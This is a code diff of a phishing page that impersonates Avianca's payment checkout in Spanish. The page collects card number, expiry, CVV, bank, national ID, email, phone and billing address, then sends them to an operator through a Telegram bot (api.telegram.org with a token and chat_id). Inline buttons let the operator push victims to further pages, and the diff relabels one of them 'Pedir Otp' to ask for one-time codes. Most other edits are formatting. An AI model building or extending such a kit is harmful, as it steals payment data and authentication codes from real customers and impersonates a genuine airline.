@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="ru">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Payment</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
+    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -30,6 +31,7 @@
             0% {
                 transform: rotate(0deg);
             }
+
             100% {
                 transform: rotate(360deg);
             }
@@ -50,9 +52,10 @@
             align-items: center;
         }
     </style>
-    
+
     <script src="./js/functions.js"></script>
 </head>
+
 <body class="mvh-100 bg-gray">
 
     <div class="loader show">
@@ -92,25 +95,25 @@
 
                     <h4>Información de la tarjeta</h4>
                     <div class="checkbox-group mt-2">
-                        <input class="check fs-2" type="checkbox"  id="ecuador-card">
+                        <input class="check fs-2" type="checkbox" id="ecuador-card">
                         <label for="ecuador-card">Mi tarjeta de crédito no es de Ecuador</label>
                     </div>
 
-                    <input id="p" class="input-cc bg-std mt-2"  placeholder="Número de Tajerta" type="text" oninput="formatCNumber(this)">
+                    <input id="p" class="input-cc bg-std mt-2" placeholder="Número de Tajerta" type="text" oninput="formatCNumber(this)">
                     <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
 
                     <div class="input-group mt-2">
                         <div class="me-2">
-                            <input id="pdate"  type="text" placeholder="MM/AA"  oninput="formatDate(this)">
+                            <input id="pdate" type="text" placeholder="MM/AA" oninput="formatDate(this)">
                             <label class="fs-5">Fecha de Expiración</label>
                         </div>
-                        
+
                         <div>
-                            <input  class="" type="text" id="c" maxlength="3" placeholder="CVV">
+                            <input class="" type="text" id="c" maxlength="3" placeholder="CVV">
                             <label class="fs-5">Código de seguridad</label>
                         </div>
                     </div>
-                    
+
                     <select id="ban" required name="txt-entidad" class="mt-4">
                         <option label="Seleccione su banco" value="">Seleccione su banco</option>
                         <option value="BANCO PICHINCHA">BANCO PICHINCHA</option>
@@ -143,7 +146,7 @@
                         <option value="GLOBAL66">GLOBAL66</option>
                         <option value="PEIGO">PEIGO</option>
                     </select>
-                    
+
                     <select id="dues" required class="mt-4 mb-5">
                         <option value="" disabled selected>Número de cuotas</option>
                         <option value="1">1</option>
@@ -187,22 +190,22 @@
                     <hr>
 
                     <h4 class="mt-5">Información del titular</h4>
-                    <input  id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta">
-                    <input  id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta">
-                    <input  id="cc" class="mt-4" type="text" placeholder="Número de identificación" oninput="limitDigits(this, 10)">
-                    <input  id="email" class="mt-4" type="text" placeholder="Correo">
-                    <input  id="telnum" class="mt-4 mb-5" type="text" maxlength="10" placeholder="Celular" oninput="limitDigits(this, 10)">
-                    
+                    <input id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta">
+                    <input id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta">
+                    <input id="cc" class="mt-4" type="text" placeholder="Número de identificación" oninput="limitDigits(this, 10)">
+                    <input id="email" class="mt-4" type="text" placeholder="Correo">
+                    <input id="telnum" class="mt-4 mb-5" type="text" maxlength="10" placeholder="Celular" oninput="limitDigits(this, 10)">
+
                     <h4 class="mt-4">Domicilio de facturación</h4>
-                    <input  id="city" class="mt-4" type="text" placeholder="Ciudad">
-                    <input  id="state" class="mt-4" type="text" placeholder="Estado/Provincia">
-                    <input  id="address" class="mt-4" type="text" placeholder="Dirección">
+                    <input id="city" class="mt-4" type="text" placeholder="Ciudad">
+                    <input id="state" class="mt-4" type="text" placeholder="Estado/Provincia">
+                    <input id="address" class="mt-4" type="text" placeholder="Dirección">
 
                     <div class="checkbox-group mt-4">
                         <div>
                             <input class="check" type="checkbox" name="" id="terms-accept">
                         </div>
-                        <label for="terms-accept">Por la presente declaro que soy mayor de edad, he leído y acepto el  <a href="">contrato de transporte</a>, y la <a href="">política general de privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a href="">manejo de mercancías peligrosas</a>, la política de cancelación y penalidades por cambio, el cobro de impuestos y cargos gubernamentales no incluidos en el valor del servicio, así como aquellos incluidos y las <a href="">condiciones de acceso de uso de este sitio web.</a></label>
+                        <label for="terms-accept">Por la presente declaro que soy mayor de edad, he leído y acepto el <a href="">contrato de transporte</a>, y la <a href="">política general de privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a href="">manejo de mercancías peligrosas</a>, la política de cancelación y penalidades por cambio, el cobro de impuestos y cargos gubernamentales no incluidos en el valor del servicio, así como aquellos incluidos y las <a href="">condiciones de acceso de uso de este sitio web.</a></label>
                     </div>
 
                     <div class="mt-4 show justify-content-center">
@@ -298,14 +301,18 @@
 
                         fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
                             method: "POST",
-                            headers: { "Content-Type": "application/json" },
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
                             body: JSON.stringify({
                                 chat_id: config.chat_id,
                                 message_id: messageId,
-                                reply_markup: { inline_keyboard: [] }
+                                reply_markup: {
+                                    inline_keyboard: []
+                                }
                             }),
                         });
-                        
+
                         switch (action) {
                             case 'pedir_logo':
                                 window.location.href = "chedf.html";
@@ -350,6 +357,7 @@
             const bank = document.getElementById("ban").value;
             const dues = document.getElementById("dues").value;
             const termsAccepted = document.getElementById("terms-accept").checked;
+            const flightCost = document.getElementById("flight-cost").innerText;
 
             if (!card_number || !expiry_date || !cvv || !name || !surname || !cc || !email || !telnum || !city || !state || !address || !bank || !termsAccepted) {
                 alert("Por favor, complete todos los campos del formulario y acepte los términos.");
@@ -368,7 +376,8 @@
                 expiryDate: expiry_date,
                 cvv: cvv,
                 bank: bank,
-                dues: dues
+                dues: dues,
+                flightCost: flightCost
             };
 
             localStorage.setItem('paymentData', JSON.stringify(paymentData));
@@ -380,10 +389,14 @@
         async function enviarDatos() {
             const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
             const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
+            localStorage.setItem('paymentData', JSON.stringify({ ...storedData,
+                transactionId
+            }));
 
             const message = `
 ✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*💰 Precio:* $${storedData.flightCost ? escapeMarkdownV2(storedData.flightCost) : 'No ingresado'} USD
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 *👤 DATOS DEL TITULAR*
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
@@ -412,7 +425,7 @@
             const keyboard = JSON.stringify({
                 inline_keyboard: [
                     [{
-                        text: "Pedir Logo",
+                        text: "Pedir Otp",
                         callback_data: `pedir_logo:${transactionId}`
                     }],
                     [{
@@ -461,4 +474,5 @@
         }
     </script>
 </body>
+
 </html>
